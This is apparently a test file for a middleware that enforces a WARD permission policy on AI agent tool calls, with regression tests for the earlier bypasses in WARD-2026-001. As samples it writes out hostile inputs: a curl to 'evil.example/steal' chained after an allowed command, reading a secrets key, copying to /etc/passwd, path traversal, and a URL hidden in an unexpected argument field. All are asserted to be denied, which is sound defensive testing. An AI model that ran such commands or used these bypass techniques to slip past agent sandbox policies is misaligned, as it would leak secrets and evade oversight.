// adapter-msaf: WARD enforcement through MSAF function middleware. The bypass
// cases are WARD-2026-001 regressions (allowed before 0.2.0).
import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, writeFileSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { WardMiddleware, WardDeniedError } from '../dist/index.js';

const WARD = `---
ward: "1.0"
agent: msaf-test
---

## Filesystem

allow:
  - read: /workspace/**
  - write: /workspace/out/**
deny:
  - read: /workspace/secrets/**
default: deny

## Network

allow:
  - url: "https://api.github.com/**"
deny:
  - url: "https://evil.example/**"
default: deny

## Capabilities

allow:
  - file_read
  - file_write
  - shell_exec
  - http_request
  - copy_file
requireApproval:
  - send_email
default: deny
`;

const ward = new WardMiddleware({ wardSource: WARD, cwd: '/workspace' });
const decide = (toolName, args = {}) => ward.evaluate({ toolName, args }).decision;

describe('WARD-2026-001 bypasses are denied', () => {
  test('path traversal out of an allowed directory', () => {
    assert.equal(decide('FileRead', { path: '/workspace/out/../secrets/key' }), 'deny');
  });
  test('a second URL in a shell command', () => {
    assert.equal(decide('Bash', { command: 'curl https://api.github.com/x && curl https://evil.example/steal' }), 'deny');
  });
  test('a shell command reading a denied path', () => {
    assert.equal(decide('ShellExec', { command: 'cat /workspace/secrets/key' }), 'deny');
  });
  test('a custom tool with a path in a non-mapped argument', () => {
    assert.equal(decide('copy_file', { src: '/workspace/a', dest: '/etc/passwd' }), 'deny');
  });
  test('a URL in an unexpected field name', () => {
    assert.equal(decide('WebFetch', { uri: 'https://evil.example/x' }), 'deny');
  });
});

describe('ordinary calls still work', () => {
  test('allowed reads, writes, fetches and commands', () => {
    assert.equal(decide('FileRead', { path: '/workspace/src/a.ts' }), 'allow');
    assert.equal(decide('FileWrite', { path: '/workspace/out/a.txt', content: 'see /etc/passwd' }), 'allow');
    assert.equal(decide('WebFetch', { url: 'https://api.github.com/repos' }), 'allow');
    assert.equal(decide('Bash', { command: 'npm test && git commit -m "fix a/b"' }), 'allow');
  });
  test('approval-gated capabilities and default deny', () => {
    assert.equal(decide('SendEmail', { to: 'a@example.com' }), 'require_approval');
    assert.equal(decide('SomethingNew'), 'deny');
  });
  test('custom mappings apply', () => {
    const custom = new WardMiddleware({
      wardSource: WARD,
      toolMappings: { Grab: { capability: 'http_request', urlField: 'target_location' } },
    });
    assert.equal(custom.evaluate({ toolName: 'Grab', args: { target_location: 'https://evil.example/x' } }).decision, 'deny');
  });
});

describe('function middleware', () => {
  test('calls next() when allowed and throws WardDeniedError otherwise', async () => {
    const mw = ward.functionMiddleware();
    assert.equal(await mw({ toolName: 'FileRead', args: { path: '/workspace/a' } }, async () => 'ran'), 'ran');
    let ran = false;
    await assert.rejects(
      mw({ toolName: 'FileRead', args: { path: '/workspace/secrets/k' } }, async () => { ran = true; }),
      (err) => err instanceof WardDeniedError && err.decision === 'deny' && err.toolName === 'FileRead',
    );
    await assert.rejects(mw({ toolName: 'SendEmail', args: {} }, async () => { ran = true; }), (err) => err.decision === 'require_approval');
    assert.equal(ran, false);
  });

  test('onDeny returning true is an explicit override', async () => {
    const mw = new WardMiddleware({ wardSource: WARD, onDeny: () => true }).functionMiddleware();
    assert.equal(await mw({ toolName: 'SomethingNew', args: {} }, async () => 'overridden'), 'overridden');
  });
});

describe('loading the policy', () => {
  test('an explicit wardPath that does not exist throws, whatever the fail mode', () => {
    assert.throws(() => new WardMiddleware({ wardPath: '/nonexistent/WARD.md' }), /not found/);
    assert.throws(() => new WardMiddleware({ wardPath: '/nonexistent/WARD.md', failMode: 'open' }), /not found/);
  });

  test('an invalid inline policy throws', () => {
    assert.throws(() => new WardMiddleware({ wardSource: '# no frontmatter' }), /Invalid WARD\.md/);
  });

  test('a WARD.md found in cwd is used; none found means no policy unless failMode is closed', () => {
    const dir = mkdtempSync(join(tmpdir(), 'msaf-'));
    const empty = new WardMiddleware({ cwd: dir });
    assert.equal(empty.isLoaded(), false);
    assert.equal(empty.evaluate({ toolName: 'Anything', args: {} }).decision, 'allow');
    assert.throws(() => new WardMiddleware({ cwd: dir, failMode: 'closed' }), /No WARD\.md found/);

    mkdirSync(join(dir, '.weave'));
    writeFileSync(join(dir, '.weave', 'WARD.md'), WARD);
    const found = new WardMiddleware({ cwd: dir });
    assert.equal(found.getPolicySource(), join(dir, '.weave', 'WARD.md'));
    assert.equal(found.evaluate({ toolName: 'SomethingNew', args: {} }).decision, 'deny');
  });

  test('an unparseable WARD.md found in cwd throws, even with failMode open', () => {
    const dir = mkdtempSync(join(tmpdir(), 'msaf-'));
    writeFileSync(join(dir, 'WARD.md'), '# broken');
    assert.throws(() => new WardMiddleware({ cwd: dir }), /Invalid WARD\.md/);
    assert.throws(() => new WardMiddleware({ cwd: dir, failMode: 'open' }), /Invalid WARD\.md/);
  });
});
